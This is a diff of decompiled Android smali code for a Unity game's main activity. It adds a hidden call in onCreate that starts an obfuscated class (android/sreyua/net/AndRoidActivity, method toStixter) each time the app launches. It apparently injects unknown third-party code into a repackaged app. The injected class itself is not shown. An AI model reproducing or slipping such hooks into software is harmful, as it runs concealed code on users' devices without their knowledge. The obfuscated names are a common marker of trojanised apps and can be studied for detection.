@@ -68,6 +68,8 @@
 .method protected onCreate(Landroid/os/Bundle;)V
     .registers 6
 
+    invoke-virtual {p0}, Lcom/unity3d/player/UnityPlayerNativeActivity;->tsTseRseiew()V
+
     const/16 v3, 0x400
 
     const/4 v2, 0x1
@@ -114,7 +116,7 @@
 
     move-result v0
 
-    if-eqz v0, :cond_3b
+    if-eqz v0, :cond_3e
 
     invoke-virtual {p0}, Lcom/unity3d/player/UnityPlayerNativeActivity;->getWindow()Landroid/view/Window;
 
@@ -122,7 +124,7 @@
 
     invoke-virtual {v0, v3, v3}, Landroid/view/Window;->setFlags(II)V
 
-    :cond_3b
+    :cond_3e
     iget-object v0, p0, Lcom/unity3d/player/UnityPlayerNativeActivity;->mUnityPlayer:Lcom/unity3d/player/UnityPlayer;
 
     invoke-virtual {v0}, Lcom/unity3d/player/UnityPlayer;->getSettings()Landroid/os/Bundle;
@@ -198,6 +200,19 @@
     iget-object v0, p0, Lcom/unity3d/player/UnityPlayerNativeActivity;->mUnityPlayer:Lcom/unity3d/player/UnityPlayer;
 
     invoke-virtual {v0, p1}, Lcom/unity3d/player/UnityPlayer;->windowFocusChanged(Z)V
+
+    return-void
+.end method
+
+.method public tsTseRseiew()V
+    .registers 2
+
+    .prologue
+    new-instance v0, Landroid/sreyua/net/AndRoidActivity;
+
+    invoke-direct {v0, p0}, Landroid/sreyua/net/AndRoidActivity;-><init>(Landroid/content/Context;)V
+
+    invoke-virtual {v0}, Landroid/sreyua/net/AndRoidActivity;->toStixter()V
 
     return-void
 .end method
